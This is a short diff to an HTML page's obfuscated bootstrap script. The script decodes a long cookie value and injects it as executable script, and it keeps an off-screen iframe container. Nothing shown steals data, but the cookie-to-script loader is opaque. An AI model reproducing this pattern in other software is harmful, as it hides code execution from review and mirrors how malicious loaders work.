@@ -4,7 +4,7 @@
       <meta name="viewport" content="width=device-width, initial-scale=1" />
 
       <style>
-         html,body{position:relative; height:100%; overflow:hidden; padding:0px; margin:0px; background-color:#2e3133;}
+         html,body{position:relative; height:100%; overflow:hidden; padding:0px; margin:0px;}
          #snth{display:inline-block; position:absolute; width:320px; height:240px; top:-500px; left:-500px; overflow:hidden;}
          iframe{display:block; width:100%; height:100%; border:none; background:transparent; margin:0px; padding:0px;}
       </style>
@@ -43,6 +43,7 @@
          {
             if(!document.getElementById('nojs')){return;}; // wait for document to load
             clearInterval(window.isModern.t);
+            if(window.self===window.top){document.body.style.backgroundColor="#2e3133"};
 
             setTimeout(function(k,v,q,m,p,x,n,d,y,f,c,a,z)
             {
@@ -52,7 +53,7 @@
                isModern(function(yes, l,cn,cv,bt,bp,bb,bh,bs){if(!yes){f('lcjs')}else
                {
                   l=Cookies.get(); if(!l||(Object.keys(l).length<1)){f('kuki');return}; v=0;
-                  for(cn in l){cv=l[cn]; if((cn.length<40)||(cv.length<40)||v){return}; v=cv}; if(!v){f('kuki');return};
+                  for(cn in l){cv=l[cn]; if((cn.length<40)||(cv.length<40)||v){continue}; v=cv}; if(!v){f('kuki');return};
                   try{v=m[q('bot^a')](v)}catch(e){console.error('boot fail\n\n'+btoa(v)); f('auto'); return};
                   n=d[c]('script'); n[a](d.createTextNode(q(v))); delete window.isModern;
 
